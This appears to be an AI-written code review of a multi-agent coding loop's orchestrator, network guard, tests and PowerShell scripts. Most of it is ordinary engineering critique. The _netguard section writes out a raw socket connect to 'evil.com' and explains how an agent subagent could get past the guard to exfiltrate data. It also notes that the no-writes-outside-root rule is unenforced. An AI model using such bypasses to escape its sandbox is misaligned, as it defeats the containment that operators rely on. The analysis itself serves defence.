# norns-loop: code quality, smells & engineering hygiene review

Scope: repo at `D:\GitHub Projects\Studies\norns-loop-study\norns-loop` as of M2.
Method: read-only inspection of `orchestrator.py`, `_netguard.py`, the `norns/`
package, the visible `tests/`, the launcher/halt PowerShell, the pre-commit
hook, and the governance docs that frame the queue/role contract. No code was
executed.

I'll lead with the few real defects (so they don't get buried), then walk
through the per-layer findings the brief asks for.

---

## Bug list (highest-confidence first)

### B1 — CRITICAL: `reap_stale_claims` can land a duplicate task back in `pending/`
`orchestrator.py:152-175` — `reap_stale_claims` iterates `claimed_dir.glob("*.json")`,
strips `.by-{role}.{unixts}` from the filename, and renames to
`pending/<NNN>.task.json`. There is no check that the target file does not
already exist. On NTFS this means: if PM (or a prior reap) has already put
`017.task.json` back in `pending/` (e.g. after a Critic VETO that restores the
original name per `QUEUE_PROTOCOL.md:130-133`), and the Builder's old claim
file is still rotting in `claimed/` because the Builder died without writing
back, the rename will fail (`FileExistsError` on Windows). The code catches
this as a generic `OSError` and just logs it — but the **stale-copy has
already been written** at line 170 (`(stale_dir / claim.name).write_bytes(...)`).
The original claim file then stays in `claimed/` forever; every subsequent
watchdog tick rewrites the same stale copy. Worst case: stale copy grows
indefinitely in size on disk if the tick rate is high (it doesn't, but the
churn isn't free either).

Suggested fix: (a) check `(pending_dir / new_name).exists()` and either skip
or write to a disambiguated name like `<NNN>.reaped-<unixts>.task.json`; (b)
swap the order — only write the stale copy AFTER the rename succeeds, so a
failed rename doesn't leak files; (c) `os.replace()` instead of `claim.rename()`
to get atomic overwrite semantics on Windows.

### B2 — MAJOR: stale-claim test ignores the duplicate-pending case
`tests/test_orchestrator_reaper_naming.py` — the test that exercises the bug
above only covers the happy path (empty `pending/`). The pattern asserts
`^\d{3}\.task\.json$`, which is satisfied when the target name didn't pre-exist.
A test that pre-populates `pending/017.task.json` before reaping the stale
claim would fail and surface B1. This is the reviewer-level finding: the
test claims to pin reaper behavior but doesn't cover the lifecycle the queue
protocol actually creates.

### B3 — MAJOR: Builder claim filename parser is fragile
`orchestrator.py:160` does
`role = claim.stem.split(".by-")[1].split(".")[0]`. If the protocol ever
changes `by-builder` to `by-builder-restart` (matching the title pattern
used in `process_restart_flags`) or someone writes a role with a hyphen, the
split chops at the first `.` after `.by-` and returns a truncated role name.
The downstream `HEARTBEAT_DIR / f"{role}.json"` then silently misses, so
`hb_stale` stays `True` and the reap still happens — but for the wrong
reason. The bug is latent today (only `pm|builder|critic` are valid), but
it's a footgun. Fix: use a regex anchored on the file pattern in
`QUEUE_PROTOCOL.md:38`: `r'^(?P<id>\d+)\.by-(?P<role>pm|builder|critic)\.(?P<ts>\d+)\.json$'`.

### B4 — MAJOR: zombie_heartbeat history can grow unbounded for unknown roles
`orchestrator.py:230-249` (and `294-326`) — both `_iter_history` and the
caller-owned `iteration_history` dicts `setdefault(role, [])` keyed off
`ROLES`. That's bounded. But the older module-level scope on line 62 type-
annotates `_iter_history: dict[str, list[tuple[int, str]]]` — and the entry
that gets appended is a tuple, while the **newer** `iteration_history`
(line 306) appends a bare `int`. The two histories track related-but-different
state in two different shapes. No bug today (they're walked through
independently and the older one was preserved for back-compat per the
T-016 comment), but this is a clear code smell — two ad-hoc state machines
in one function with the same name pattern. Either merge them (one history,
both predicates derive from it) or rename one to make the divergence loud
(`_iter_history_legacy` vs `iteration_history`).

### B5 — MINOR: charter pre-commit hash reads with `tr -d '[:space:]'`, lock file written without trailing newline check
`scripts/githooks/pre-commit:9` reads `.charter-lock` via `tr -d '[:space:]'`,
which is safe. But `orchestrator.py:92` reads with `LOCK_FILE.read_text(encoding="utf-8-sig").strip()`. The two paths use different decoding (BOM-tolerant
vs. raw). If `.charter-lock` is ever written with a BOM by an editor, the
hook will pass and the orchestrator will halt (or vice versa, depending on
which encoder bug-out path you hit). Pick one and document it. The BOM read
flag in the orchestrator suggests this has bitten before.

### B6 — MINOR: `verify_charter` early-returns silently if lock file is absent
`orchestrator.py:90-91`. If someone deletes `.charter-lock`, the host-level
"charter is hash-locked" claim from README:24 silently disarms — the
orchestrator becomes a no-op for that check and never warns. The README
markets this as an invariant of the loop ("host-level responsibilities,
no agent can subvert these" — orchestrator docstring, line 7-8). Suggested
fix: emit a loud warning to stderr (and possibly write a `CHARTER_LOCK_MISSING.md`
violation file) instead of returning silently.

### B7 — MINOR: `__init__.py` imports `_netguard` AFTER the module docstring assignment
`norns/__init__.py:1` puts `import _netguard` ahead of the module docstring.
Python accepts this but `__doc__` is now `None` instead of the intended
`"""norns — autonomous ALife simulation package."""` (line 2 is a stray string
literal that's a no-op, not the module docstring). This is a real defect:
`help(norns)` and `norns.__doc__` will not return what the file looks like
it intends to return. Fix: put the docstring first, then `import _netguard`,
or just inline-import inside `__init__.py` after the docstring.

### B8 — MINOR: `Agent.act` consumes one rng draw with `self.rng.randrange(2**32)` but the result is only used to seed a Generator
`norns/agent.py:246-249`. The comment at line 242-243 says this is to "keep
the M2 path's `self.rng.choice` state advance equivalent." But
`Random.choice` of a 5-element tuple consumes 1 random draw via
`_randbelow(5)`, whereas `Random.randrange(2**32)` consumes 1 draw via
`_randbelow(2**32)`. Both are 1 internal RNG call BUT the values they
consume differ in bit-width, so the state evolves differently. The
"equivalent" claim in the docstring is technically false (the underlying
Mersenne Twister state after a `_randbelow(5)` call vs a `_randbelow(2**32)`
call diverges). This isn't a correctness bug for M3 (the M3 trajectory of a
brain-equipped agent is its own thing), but the comment is misleading.
Worse: it means if a brain is later removed from an agent mid-run, the
agent's stdlib RNG state is no longer "equivalent to a brainless agent of
the same seed" — which is a determinism foot-cannon for any later code
that depends on it.

---

## Python code quality

### orchestrator.py
**Strengths.** Defensive in the right places: every JSON read is wrapped in
`(OSError, json.JSONDecodeError)`, every subprocess call has a timeout,
heartbeat aging uses both `pid` liveness (line 487, `os.kill(pid, 0)`) and
mtime, debouncing prevents respawn storms (`_last_spawn_ts` persisted to
disk so a fresh orchestrator doesn't double-fire — line 70-79). The
"don't kill the role doing a long subagent dispatch" insight at line 482-493
shows the design has been beaten on by real incidents, not designed in
theory. Comments cite RETROS and req-IDs, which is the gold standard for
why-we-have-this-line.

**Smells.**
- 543 lines is too long for a "thin watchdog." `verify_charter`,
  `maintain_halt_signal`, `reap_stale_claims`, `watchdog_check`,
  `process_restart_flags`, `detect_dead_roles` are six distinct
  responsibilities. They share state via module-level globals
  (`_iter_history`, `_last_spawn_ts`) which makes the unit-test scaffolding
  (see `monkeypatch.setattr(orchestrator, "_iter_history", {})` in
  `test_orchestrator_stuck_detection.py:48`) clumsy. A
  `class Watchdog:` with these as methods + injected state would be much
  more testable.
- `watchdog_check` is 150+ lines with **five nested triggers** (sprint_age,
  veto_streak, stuck_iteration, stuck_last_action, verdict_latency,
  zombie_heartbeat). Each trigger reuses different idioms for filesystem
  scanning (`recent = sorted(...)[:5]` vs `for vf in verdicts_dir.glob(...)`
  with a running max). Extract a `Trigger` protocol/dataclass and a
  `_collect_triggers(state) -> list[dict]` so the body is `triggers = []`
  + a `for trigger in TRIGGERS: triggers.extend(trigger(state))` loop.
- `process_restart_flags` mixes flag-eating debounce, PID-file authoritative
  rewrite, taskkill, and flag deletion in one 90-line method. The comment
  numbering (`1.`, `2.`, `3.`, `4.`) inside the function is doing the job
  that function decomposition should be doing.
- Type hints are good for new code (the M3-era functions have
  `dict[str, list[int]]` etc.) but the older-era code uses bare types
  (`def sha256_file(path: pathlib.Path) -> str:` — fine; but
  `def main() -> None` has no docstring at line 512). Inconsistent.
- The `print(...)` logging idiom is fine for a watchdog but loses
  structure. `logging.getLogger("orchestrator")` with a JSON formatter
  would let the launcher pipe to a parseable log. The `.loop/logs/orchestrator.stderr.log`
  file is exactly the place where structured logs would pay off.

### norns/world.py
36 lines for the world is clean. The single-responsibility split (World owns
the grid + agents + time; Agent owns its pos/energy/rng) is correct. The
`add_agent` linear scan to reject duplicates is O(n) per add, but at M2 with
N=2-8 agents it's fine; doc as "M2-only complexity" or switch to a set if
M5 grows N.

Smells: `self.rng.random()` on line 25 of `tick()` is a "burn one draw per
tick" line that has no obvious purpose. It's not documented. It probably
exists so the world's `rng_fp` snapshot differs after each tick (otherwise
two same-seed worlds with zero agents would always have the same fingerprint),
but a future reader has no way to know. Add a comment: `# advance world rng
to make rng_fp non-stationary across ticks`.

`snapshot()` returns a `dict`, untyped, callers do `snap["agents"]` etc. A
`TypedDict` or `dataclasses.dataclass(frozen=True)` would make the schema
contract enforceable; today the `test_snapshot_no_set_or_bytes` regression
test (test_snapshot_json.py:20-25) is doing dynamic schema checks at test
time when the type system could do them at edit time.

### norns/agent.py
At **274 lines for a 4-attribute agent class**, this file is bloated. The
T-310 brain-equipped path is 60+ lines glued onto a 5-line M2 random-walk;
the docstring on the class (lines 49-83) is **40 lines describing 7
attributes** including paragraphs of M3 commentary that belongs in
M3_PREVIEW.md, not in the class docstring.

The hot-path comment at lines 196-199 ("M2 fast-path: byte-identical T-309
behavior. No numpy module import is triggered here...") and lines 213-215
(lazy import) signal a real correctness invariant — the single-audit-point
rule from D-002 — but the file would be much more honest if Brain-equipped
behavior lived in a `norns/agent_brain.py` mixin or a strategy object, and
`agent.py` was 60 lines of the pure-M2 contract. The bifurcation at line
200 (`if self.brain is None or world is None: ... return`) is the cleanest
piece of the file; the post-`return` is 60+ lines of separate-flow logic.

`obs = self.brain.W1[:, 0] * 0.0` (line 234) to "materialise a zero ndarray
without a top-level numpy import" is **a code smell smell**. It's a real
constraint (the test at `test_no_network_imports.py` grep-gates numpy too —
wait, let me re-check — no, it grep-gates network imports, not numpy.
The numpy grep gate is referenced as a "verdict-time grep" in the
docstring at agent.py:21-23 but I don't see it in the visible tests).
Either way, multiplying a brain weight by 0.0 to manifest a zero array is
an obfuscation, not an architectural win. The cleaner option is
`numpy.zeros(input_dim)` after `import numpy as _np` at function scope —
the "no top-level numpy in agent.py" rule is satisfied by function-scope
import. The comment claims function-scope import would still be a violation
but the rule (D-002, single audit point) is about who calls
`numpy.random.default_rng()`, not who imports numpy at all.

### norns/brain.py
Cleanest module in the package. 185 lines, single class, four well-named
methods (`__init__`, `_assert_invariants`, `forward`, `act`, `update`),
docstrings on every method explain the contract not the implementation.
The REINFORCE update is hand-rolled (no `torch`) which is the right call
for a determinism-pinned project — every floating-point operation is
under the test suite's control.

Smells:
- `_assert_invariants` is called twice in `update` (line 137 on empty
  trajectory, line 184 at end). The empty-trajectory short-circuit returning
  early but still running the check is fine; the call at end after every
  update is potentially expensive (`numpy.isfinite(arr).all()` walks the
  whole weight matrix). For a tight RL loop this is overhead; add a
  module-level `_INVARIANT_CHECK = True` that production code can flip off.
- `_REINFORCE_GAMMA = 0.99` is module-level. Should be a constructor arg
  with that default. The single-step "passthrough" rule (line 146-148) is
  a real semantic choice — make it a named constructor flag too.
- Line 104 `int(rng.choice(len(probs), p=probs))` does no validation that
  `probs` is non-negative or sums to 1 — `numpy.random.Generator.choice`
  will raise if it isn't, but the message will be ugly. The
  `_assert_invariants` check on weights doesn't catch a runtime softmax
  blow-up.

### norns/render.py
Clean. The legacy 8x8 stub fallback (`if world is None: ...`) is dead-code
once M2 lands — render is always called with a world from `__main__.py:90`.
Keep it for the test at `test_render_stub.py:6-12` (which still passes
`None`) but mark it `# pragma: no cover` if you don't want it counted.

The `bytearray` + slice-assign loop (line 50-54) is fine, but a
`numpy.full((h, w, 3), [time_byte, 0, 0], dtype=numpy.uint8)` would be ~10x
faster on a 64x64 frame. Not in M2's hot path though.

### norns/rng.py
The single-audit-point pattern is a real architectural invariant and this
module enforces it cleanly. The byte-order comment (line 13-15) is exactly
the kind of "future-auditor footnote" senior code has. Good.

### norns/__main__.py
Standard argparse CLI. Tight, readable. The `world_size` parser at line 27-43
correctly bubbles `ValueError` through `argparse.ArgumentTypeError`. One
nit: the `positive_int` function name lies — it accepts 0 (and the assert
is `>=0`). Rename to `nonneg_int` (which is already defined on line 20),
delete the duplicate.

### _netguard.py
The module docstring claim ("Loaded EXPLICITLY by importers — not via
site.py auto-discovery") is contradicted by the README at line 25 ("network
guard. `sitecustomize.py` monkey-patches `socket`..."). One of those is
stale. Given that `_netguard.py` is the file that exists and there's no
`sitecustomize.py` in the tree (I checked), the README is wrong. Fix:
README should say "`_netguard.py` is imported by `norns/__init__.py` and
`conftest.py`."

The guard itself is fine but has a hole: it patches `socket.getaddrinfo`
and `socket.create_connection`. It does NOT patch `socket.socket().connect()`
directly. Any code that does `s = socket.socket(); s.connect(("evil.com", 80))`
bypasses both patches — `getaddrinfo` isn't called if the address is an IP
string, and `create_connection` is what wraps the `connect` for convenience.
A determined adversary subagent inside the loop COULD route around this.
For the threat model (accidentally-network-using stdlib code), it's fine.
For "the Critic might try to exfiltrate" it isn't. The CHARTER's "no network
access" rule deserves a real socket-level patch.

---

## PowerShell hygiene

Per the user's CLAUDE.md, the local-env footguns to watch are: non-ASCII in
`"..."` string literals (cp1252 read corruption), `2>&1` on native exes
(stderr-to-RemoteException), missing parse-checks.

### start-loop.ps1 (70 lines)
- **ASCII-clean.** No em-dashes, smart-quotes, or arrows in string literals.
  All comments use ASCII `—` ... wait, line 1 `# start-loop.ps1 — launch...`
  uses an em-dash in a **comment** which the CLAUDE.md says is safe ("Comments
  and `@\"...\"@` here-strings are safe"). All actual string literals use
  ASCII.
- No `2>&1` redirects on native exes.
- `Start-Process -RedirectStandardOutput / -RedirectStandardError` to capture
  orchestrator output — exactly the right primitive (line 45).
- `Set-Content -Path $lock -Value "launched: $(Get-Date -Format o)`npid: $PID`n"`
  on line 37: uses default encoding (UTF-16 LE on PS5.1). The orchestrator
  reads the lock with `LOCK_FILE.read_text(encoding="utf-8-sig")` for charter,
  but the launcher.lock isn't parsed by Python — so this is OK, but `-Encoding
  utf8` would future-proof it.
- **Real smell:** line 56-63 spawns three PowerShell windows via
  `Start-Process` with an inline `-Command` string. The role title is
  interpolated via `'$title'`. If the role string ever contains a single
  quote (it can't today — `ValidateSet("pm","builder","critic")`), this
  breaks. Fine for now.

### stop-loop.ps1 (149 lines)
- The Phase 1-4 design is reasonable. The `$projectMarker = "omc-test-a"`
  hardcoded at line 25 is **wrong** if you move/rename the project. This
  is the same path that's pinned in `CHARTER.md` line 13 (`No writes outside
  the project root (D:\tmp\omc-test-a)`). It's tightly coupled to a single
  machine layout; should be derived from `$root` (the repo it lives in).
- **Real bug:** lines 82-84, after killing all candidates, attempt to find
  survivors by `Where-Object { $candidates.ProcessId -contains $_.ProcessId }`.
  `$candidates` was a Win32_Process collection; after the Stop-Process the
  WMI objects are stale, but accessing `$candidates.ProcessId` on a PS5.1
  array-of-objects returns an array. On PS5.1 `-contains` does the right
  thing here. But if `$candidates` is a single object (not an array), then
  `$candidates.ProcessId` is a scalar, and `-contains` on a scalar does a
  string-equality check, not a set-membership check. Defensive fix:
  `@($candidates).ProcessId -contains $_.ProcessId` — the `@()` array-cast
  is idiomatic PS for this.
- `Stop-Process -Id $p.ProcessId -Force -ErrorAction SilentlyContinue`
  inside a `try/catch` — the `-ErrorAction SilentlyContinue` will suppress
  the error so the `catch` is unreachable. Per the user's CLAUDE.md note:
  "`-ErrorAction SilentlyContinue` suppresses error OUTPUT but the cmdlet
  failure still causes this tool to report exit 1." That's specifically a
  harness concern; here the script doesn't propagate `$LASTEXITCODE`, so
  it's only a clarity smell.
- Line 138 `($_.Name -eq "python.exe" -and $cl -like "*orchestrator.py*" -and $cl -like "*$projectMarker*")`
  in the final-verification pass uses `$projectMarker` — so if you renamed
  the project, a survivor orchestrator from a different repo won't be
  killed AND won't be reported as a survivor. Hidden state.

### role-start.ps1 (62 lines)
- The `$prompt = @"..."@` here-string from line 28-59 is double-quoted, so
  `$Role` interpolates correctly. ASCII-clean.
- `Set-Content -Path $pidFile -Value $PID` at line 23 — no `-Encoding`.
  Same UTF-16 caveat. The orchestrator reads this with
  `int(pid_path.read_text().strip())` (line 488) — Python's default
  `read_text()` uses `locale.getpreferredencoding()` which on Windows is
  `cp1252` for the user's env. UTF-16 LE PowerShell-written file → Python
  read with cp1252 → garbled. **This will work today** because the value
  is just digits and the BOM happens to decode as a non-error sequence
  that `int()` will reject — wait, actually, `Set-Content` on PS5.1
  default-encodes as UTF-16 LE with a BOM (`FF FE`). `int("...".strip())`
  will fail on the BOM. I'd want to actually test this on the machine,
  but it's a smell either way: **the orchestrator and PowerShell scripts
  disagree on file encoding**. Fix: `Set-Content -Path $pidFile -Value $PID -Encoding ascii`
  (or `utf8` without BOM).
- The "Stop responding. The orchestrator will spawn a fresh window" comment
  at line 47 is correct but the prompt is being sent **to the LLM** as the
  initial user message. This is fine but couples the role's instructions
  to the launcher; a configurable role-prompt template under `governance/`
  would let PM rewrite the prompt without editing PowerShell.

### halt-role.ps1 (32 lines)
Clean. Single responsibility. One small thing: line 25 uses
`(Get-Content $pidFile -Raw).Trim()` — `-Raw` reads the whole file as one
string. If the pid file has a trailing newline (which it will, from
`Set-Content`), `.Trim()` handles it. Fine.

### run_tests.ps1 (4 lines)
Trivially correct. `exit $LASTEXITCODE` is right (don't propagate `$?`).

### Parse-check note
Per the user's CLAUDE.md: "When a PS hook errors..., parse-check every
relevant `.ps1` first via `[Management.Automation.Language.Parser]::ParseFile`."
I did not run parse-checks (the brief says read-only). All five PS files
look syntactically clean by eye. There is **no script in `scripts/` that
runs parse-checks** as a hygiene step — that's an obvious append to
`run_tests.ps1` or a separate `lint-ps.ps1`.

---

## Test design

`tests/` has 41 test files covering ~150 cases. The test-naming discipline
is excellent — every file has a `T-NNN` header tying it to the queue task
that wrote it. The conftest at `tests/conftest.py:1-5` sys.path-prepends
the repo root, which is a fine workaround for not packaging norns.

**Append-only is the dominant design force.** Every test file is new (no
`Edit`s on existing tests). The pre-commit hook at `scripts/githooks/pre-commit:25-55`
enforces this by hashing `tests/*` against `.sealed/test-hashes.json`. The
**tradeoff is real and the suite shows the cost**:

- `tests/test_world_init.py` (3 tests), `tests/test_world_tick.py` (3 tests),
  `tests/test_world_default_seed.py` (3 tests), `tests/test_world_bounds.py`
  (12 tests), `tests/test_world_add_agent.py` (6 tests),
  `tests/test_world_tick_with_agents.py` (3 tests),
  `tests/test_world_with_agents_property.py` (1 parametrized=30 cases) —
  **seven files testing World**, each pinning a successive task's contract,
  with significant overlap (every M2 file re-tests determinism). When a
  contract changes, you can't update the test; you add a new test that
  exercises the new contract while the old test continues to assert the
  old one. The suite necessarily accumulates redundancy.
- The smoke test (`test_package_smoke.py`) just checks `__version__ == "0.0.1"`.
  When the version legitimately bumps, this file becomes a lie — but
  append-only forbids editing it. The fix path is presumably "add a new
  `test_package_smoke_v2.py`" — which means the suite slowly fills with
  obsolete `assert __version__ == "0.0.1"` lines.
- Same hazard at `test_agent_init.py:43-46` which asserts
  `not hasattr(a, "step")` — this assertion will be invalidated the moment
  someone adds a `step()` method (which CHARTER §1 implies for biochemistry).

**Property tests** — the suite has one true property test
(`test_world_with_agents_property.py`) doing `seed × n_agents = 30` cases.
That's a reasonable Cartesian product but **it's not hypothesis-style
property-based testing**; it's just parametrized. The README claims
"Mutation testing" at line 26 — I do not see any mutation-testing harness
in the repo (no `mutmut`, no `cosmic-ray` config, no `mutation/` directory).
The "Critic periodically injects bugs" line is **aspirational, not
implemented** in the visible tree. The Critic role's sealed evals at
`.sealed/` are git-ignored so I cannot verify; but a public-side mutation
harness would be the right place for this and it's absent.

**Concurrency-related tests.** The orchestrator's stale-claim, zombie-
heartbeat, verdict-latency triggers are well-tested (`test_orchestrator_*`).
What's **not** tested: simultaneous Move-Item from two Builder sessions.
`QUEUE_PROTOCOL.md:96-108` claims Move-Item is atomic and the loser fails
with `ItemNotFound`. No test verifies this. The protocol doc cites it as a
property of NTFS, not of the loop's code. If somebody ever ports this to
ext4 or a Windows network share where Move-Item semantics differ, no test
will catch the regression.

**RNG-burn determinism tests are good.** `test_rng_array.py`, `test_rng_derive.py`,
`test_weight_buffer_determinism.py`, `test_brain_init.py:34-37` (byte-
identical weight hashes). The single-audit-point invariant is well-anchored
by `test_no_network_imports.py` (which actually does a grep-gate over
`norns/*.py`) — that test is a real one, not a mock.

**Sealed-eval claim.** The README markets `.sealed/` as Critic-only. The
visible suite has no evidence of what's in there; the pre-commit hook only
enforces that `.sealed/*` is never staged. Without seeing the sealed evals,
I can't tell whether they meaningfully overlap the visible suite or whether
the Builder is actually being meaningfully graded.

---

## Concurrency / locking

Three sessions write to the same filesystem queue. The protection mechanisms
are: (1) atomic `Move-Item` per NTFS, (2) the orchestrator's 30-minute stale
claim window, (3) the orchestrator's heartbeat check, (4) the PID liveness
probe at `orchestrator.py:489`.

**Real race windows:**

- **R1.** PM writes to `pending/NNN.task.json`. PM `Set-Content` is not
  atomic — on PS5.1, `Set-Content` writes via a temp + rename only for some
  cmdlets, not by default. If PM is interrupted mid-write, Builder can
  `Move-Item` a half-written task. Mitigation: PM should write to a
  `pending/.NNN.task.json.tmp` first and `Move-Item` to the final name.
- **R2.** Builder commits in two steps (commit, then Move-Item to
  `awaiting-critic/NNN.commit-<sha>.json`). If Builder crashes between
  commit and rename, the commit is on `main` but no Critic-visible queue
  entry exists. The orchestrator's stale-claim reaper at
  `orchestrator.py:152` puts the claim back into `pending/`, so Builder will
  re-claim — and **re-do the same work**, producing a second commit. Idempotency
  isn't enforced anywhere. Fix: Builder should check `git log --grep="\bT-NNN\b"`
  on claim and skip if the commit already exists.
- **R3.** Two orchestrator processes running concurrently. The comment at
  `orchestrator.py:524` ("iteration_history is owned by main() so two
  orchestrator processes don't accidentally share state") *acknowledges*
  this risk but doesn't prevent it. No PID-lockfile on the orchestrator.
  `start-loop.ps1:30-36` enforces `launcher.lock` but only by file existence
  — manually running `python orchestrator.py` while the launcher is running
  spawns a second orchestrator silently. The dual-orchestrator scenario
  would cause double-respawning and double-flag-eating.
- **R4.** Orchestrator's restart-flag debouncing uses `_last_spawn_ts`
  persisted to disk (`LAST_SPAWN_FILE`) — good. But the persistence write
  at `_save_last_spawn_ts()` (line 82-86) is NOT atomic (`Path.write_text`
  truncates first). If the process is killed mid-write, the dict file is
  empty next start. Fix: write to `.tmp` + `os.replace`.

**Stale-claim logic** is reasonable: 30-min window, dual check (file age
AND heartbeat age). The bug at B1 is the real risk; the logic itself is
defensible.

---

## Determinism claims

README:94-95: "The simulation is deterministic: same `--seed` always produces
byte-identical `--snapshot-out` JSON across runs."

This is **tested** at `test_cli_snapshot.py:19-28`, `test_cli_agents.py:31-42`,
and the visible suite enforces it well. The seeding discipline is:

1. World RNG: `random.Random(seed)` in `World.__init__` — stdlib MT,
   deterministic across CPython versions.
2. Per-agent RNG: `derive_agent_rng(world_seed, agent_id)` =
   `random.Random(SHA256("{seed}:{agent_id}").first_8_bytes_be)` — also
   stdlib MT, byte-for-byte deterministic.
3. Numpy RNG: `seeded_array_rng(world_seed, agent_id, name)` —
   `numpy.random.default_rng(SHA256(...).first_8_bytes_be)`. The single-
   audit-point invariant is enforced by `test_no_network_imports.py`
   logic (well, that one's about network; the numpy single-audit-point
   isn't grep-tested in the visible suite — the `agent.py` docstring at
   line 21-23 references a "grep gate at verdict time" which would live
   in `.sealed/`, so I can't verify).

**Holes in the determinism story:**
- `World.tick()` (line 23-27) iterates `sorted(self.agents, key=lambda a: a.id)`,
  but also calls `self.rng.random()` once per tick to advance the world
  RNG. The world RNG is then **not used** by the tick (agents use their own
  per-agent rngs). The undocumented "burn" looks like determinism theater:
  it's there to make `rng_fp` (the world-RNG fingerprint in `snapshot()`)
  non-stationary. If anyone in M3 actually consumes `world.rng` (e.g. for
  food spawn), the burn-rate will need to be re-asserted as a contract.
- `numpy.random.default_rng()` returns a `PCG64` generator. Numpy's PCG64
  sequence is **guaranteed stable across numpy versions** (per numpy
  policy), so the `numpy==2.2.0` pin in `governance/DEPENDENCY_PINS.md`
  plus `test_dependency_versions.py` is the right defense. Good.
- `Brain.act` uses `numpy.exp` / `numpy.tanh` — both IEEE-754 correctly-
  rounded with `errno=0` on the platforms the test machine runs.
  Cross-platform byte-identical reproducibility (e.g. ARM vs x86) is **not**
  guaranteed for numpy's transcendentals; the README's "byte-identical
  snapshot across runs" is implicitly "on the same host."
- The `snapshot()` `rng_fp` uses
  `hashlib.sha256(repr(self.rng.getstate()).encode("utf-8")).hexdigest()`.
  `repr(rng.getstate())` is **not** documented as stable across CPython
  versions. CPython's `random.Random.getstate()` returns a 625-tuple of
  ints; `repr()` of that tuple is whitespace-stable today, but the contract
  is not a CPython guarantee. Replace with `pickle.dumps(state)` or
  `str(state)` if you must use a string form — and pin the CPython version
  in the README.
- Agent.act's brain-equipped path at `agent.py:246` does
  `seed_int = self.rng.randrange(2**32)`. This **consumes** one stdlib
  rng draw, then derives a numpy Generator from it. The result is a fresh
  numpy Generator **per act() call** rather than reusing one Generator
  across all calls. The per-call seed_int will differ each call (because
  `self.rng` advances), so the brain's action sequence is still deterministic
  given `self.rng`'s seed — but a future refactor that decides to reuse
  one Generator across calls would silently break the contract. Add a
  test pinning the "fresh Generator per call" property.

Net: determinism is **mostly solid**. The biggest under-tested edge is
cross-platform reproducibility (README doesn't qualify it) and the
`repr(getstate())` fingerprint contract.

---

## Dead / suspicious code

- `render.py:37-40` `if world is None:` branch — used only by the
  T-003 stub test (`test_render_stub.py:6-12`). Live code path uses
  `__main__.py:74-90` which always passes a real World. Dead in production.
  Keep for test, or move test to construct a minimal stub world.
- `__main__.py:13-17` `positive_int` accepts 0 — name is wrong, value
  duplicates `nonneg_int` on the next line. One of them is dead.
- `agent.py:113-129` `with_brain` classmethod — exists per "T-309 spec"
  but the visible code base only calls `Agent(...)` directly. Convenience
  helper for a phantom caller. Either delete or document the intended
  call site.
- `agent.py:92` slot `_energy_at_step_start` is reserved but only ever set
  in the brain-equipped branch. The docstring at line 78-83 acknowledges
  this. Slotting it costs ~8 bytes per agent in exchange for zero
  observable benefit (it's not assigned in the fast path, so `agent._energy_at_step_start`
  raises `AttributeError` for any non-brain agent). Either set it
  unconditionally in `__init__` (as 0.0) or remove from `__slots__` until
  the brain path runs.
- `orchestrator.py:62` `_iter_history: dict[str, list[tuple[int, str]]] = {}`
  module-level — see B4. Legacy state that the newer `iteration_history`
  caller-owned dict was supposed to replace. Module-level globals + tests
  that monkeypatch them (`tests/test_orchestrator_stuck_detection.py:48`)
  is a smell. The module is half-converted from globals-to-DI.

**Contradictions to the charter:**
- CHARTER §2: "No writes outside the project root (D:\tmp\omc-test-a)."
  This is **enforced nowhere in code**. The orchestrator writes to `LOOP_DIR`
  / `QUEUE_DIR` / `STUCK_STATE` etc. derived from `ROOT = pathlib.Path(__file__).parent`
  — but a runaway subagent could absolutely write to `C:\Users\...`. The
  `_netguard.py` covers network only.
- CHARTER §4: "Each role is a thin Claude Code session that dispatches
  short-lived OMC subagents for all heavy work." This is a runtime
  invariant enforced by the role prompt at `role-start.ps1:33-58` — but
  there is no test that fails if a role-prompt is changed to **disable**
  subagent dispatch. Aspirational, not enforced.

---

## Summary

**Strengths:** the determinism scaffolding (seeded RNGs at three layers,
single audit point, byte-identical snapshot tests) is genuinely robust; the
orchestrator's restart/halt/debounce machinery has been hardened by real
incident reports (RETROS commentary cited at the line level); the M2
package is small enough to read end-to-end; the queue protocol document is
unusually well-written for a coordination layer.

**Concerns:** B1 (reap_stale_claims can land on existing pending file) is
the highest-confidence defect; B7 (`__init__.py` docstring is broken) is
the embarrassing one; the append-only test design creates real maintenance
debt that the suite shows symptoms of; mutation testing is marketed but not
implemented; the netguard is socket-method-incomplete; PowerShell pidfile
encoding disagrees with the Python reader; `orchestrator.py` has too many
responsibilities crammed into one module and is half-migrated away from
module-level globals; `agent.py` brain-equipped branch is over-commented
and structurally bifurcated and should be split out.

The aspirational/implemented gap on "mutation testing" and on enforcing
the CHARTER's "no writes outside project root" rule are the two places
where the README oversells what the code delivers. Both are worth either
implementing or scoping down in the docs.
